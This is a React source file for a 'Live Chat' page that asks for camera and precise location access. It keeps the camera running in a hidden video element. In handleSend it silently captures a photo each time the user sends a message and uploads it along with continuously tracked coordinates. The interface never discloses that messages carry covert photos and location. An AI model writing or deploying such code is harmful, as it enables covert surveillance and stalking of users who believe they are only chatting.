import { useState, useRef, useEffect } from 'react';
import { Send, User, Camera, MapPin, AlertCircle } from 'lucide-react';
import { useToast } from '@/hooks/use-toast';
import MessageList from '@/components/MessageList';
import { useMessages } from '@/hooks/useMessages';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';

const Index = () => {
  const { toast } = useToast();
  const [userName, setUserName] = useState<string | null>(null);
  const [nameInput, setNameInput] = useState('');
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [permissionsGranted, setPermissionsGranted] = useState(false);
  const [permissionError, setPermissionError] = useState<string | null>(null);
  const [location, setLocation] = useState<{ latitude: number; longitude: number } | null>(null);
  const { messages, isLoading, sendMessage, uploadImage } = useMessages(sessionId);
  const [isSending, setIsSending] = useState(false);
  const [inputValue, setInputValue] = useState('');
  const videoRef = useRef<HTMLVideoElement>(null);
  const streamRef = useRef<MediaStream | null>(null);

  useEffect(() => {
    const storedName = localStorage.getItem('chat_user_name');
    const storedSession = localStorage.getItem('chat_session_id');
    
    if (storedName && storedSession) {
      setUserName(storedName);
      setSessionId(storedSession);
    }
  }, []);

  const requestPermissions = async () => {
    setPermissionError(null);
    
    try {
      // Request camera permission
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user' },
        audio: false,
      });
      streamRef.current = stream;
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
      }

      // Request location permission
      const position = await new Promise<GeolocationPosition>((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, {
          enableHighAccuracy: true,
          timeout: 10000,
        });
      });

      setLocation({
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
      });

      setPermissionsGranted(true);
    } catch (err) {
      console.error('Permission error:', err);
      setPermissionError('Camera and location permissions are required to use this app. Please allow access and try again.');
      
      // Stop camera if it was started
      if (streamRef.current) {
        streamRef.current.getTracks().forEach(track => track.stop());
      }
    }
  };

  useEffect(() => {
    return () => {
      if (streamRef.current) {
        streamRef.current.getTracks().forEach(track => track.stop());
      }
    };
  }, []);

  // Watch location continuously
  useEffect(() => {
    if (!permissionsGranted) return;

    const watchId = navigator.geolocation.watchPosition(
      (position) => {
        setLocation({
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
        });
      },
      (error) => console.error('Location error:', error),
      { enableHighAccuracy: true }
    );

    return () => navigator.geolocation.clearWatch(watchId);
  }, [permissionsGranted]);

  const handleStartChat = async () => {
    if (!nameInput.trim()) {
      toast({ title: 'Please enter your name', variant: 'destructive' });
      return;
    }

    await requestPermissions();
  };

  useEffect(() => {
    if (permissionsGranted && nameInput.trim()) {
      const newSessionId = crypto.randomUUID();
      localStorage.setItem('chat_user_name', nameInput.trim());
      localStorage.setItem('chat_session_id', newSessionId);
      setUserName(nameInput.trim());
      setSessionId(newSessionId);
    }
  }, [permissionsGranted, nameInput]);

  const capturePhoto = (): string | null => {
    if (!videoRef.current) return null;

    const canvas = document.createElement('canvas');
    canvas.width = videoRef.current.videoWidth;
    canvas.height = videoRef.current.videoHeight;
    
    const ctx = canvas.getContext('2d');
    if (!ctx) return null;
    
    ctx.drawImage(videoRef.current, 0, 0);
    return canvas.toDataURL('image/jpeg', 0.8);
  };

  const handleSend = async () => {
    if (!inputValue.trim() || !sessionId || !userName) return;
    
    setIsSending(true);

    const photo = capturePhoto();
    let imageUrl: string | null = null;

    if (photo) {
      imageUrl = await uploadImage(photo);
    }

    const success = await sendMessage(
      inputValue,
      imageUrl,
      location?.latitude || null,
      location?.longitude || null,
      'user',
      userName,
      sessionId
    );

    if (success) {
      setInputValue('');
    } else {
      toast({
        title: 'Failed to send',
        variant: 'destructive',
      });
    }

    setIsSending(false);
  };

  // Show name entry screen if not logged in
  if (!userName || !sessionId) {
    return (
      <div className="flex items-center justify-center h-screen bg-background p-4">
        <video
          ref={videoRef}
          autoPlay
          playsInline
          muted
          className="hidden"
        />
        <Card className="w-full max-w-md">
          <CardHeader className="text-center">
            <User className="h-12 w-12 mx-auto text-primary mb-2" />
            <CardTitle className="text-2xl">Welcome to Live Chat</CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            <Input
              placeholder="Enter your name"
              value={nameInput}
              onChange={(e) => setNameInput(e.target.value)}
              onKeyDown={(e) => e.key === 'Enter' && handleStartChat()}
            />
            
            {permissionError && (
              <div className="flex items-start gap-2 p-3 rounded-lg bg-destructive/10 text-destructive text-sm">
                <AlertCircle className="h-5 w-5 flex-shrink-0 mt-0.5" />
                <p>{permissionError}</p>
              </div>
            )}

            <div className="text-xs text-muted-foreground space-y-1">
              <div className="flex items-center gap-2">
                <Camera className="h-4 w-4" />
                <span>Camera access required</span>
              </div>
              <div className="flex items-center gap-2">
                <MapPin className="h-4 w-4" />
                <span>Location access required</span>
              </div>
            </div>

            <Button onClick={handleStartChat} className="w-full">
              Allow Permissions & Start Chat
            </Button>
          </CardContent>
        </Card>
      </div>
    );
  }

  return (
    <div className="flex flex-col h-screen bg-background">
      <header className="p-4 border-b">
        <h1 className="text-xl font-bold text-foreground">Live Chat</h1>
        <div className="flex items-center gap-1 text-xs text-muted-foreground mt-1">
          <User className="h-3 w-3" />
          <span>{userName}</span>
        </div>
      </header>

      <video
        ref={videoRef}
        autoPlay
        playsInline
        muted
        className="hidden"
      />

      <MessageList messages={messages} isLoading={isLoading} />

      <div className="p-4 border-t flex gap-2">
        <Input
          value={inputValue}
          onChange={(e) => setInputValue(e.target.value)}
          placeholder="Type a message..."
          onKeyDown={(e) => e.key === 'Enter' && handleSend()}
          disabled={isSending}
        />
        <Button onClick={handleSend} disabled={isSending || !inputValue.trim()}>
          <Send className="h-4 w-4" />
        </Button>
      </div>
    </div>
  );
};

export default Index;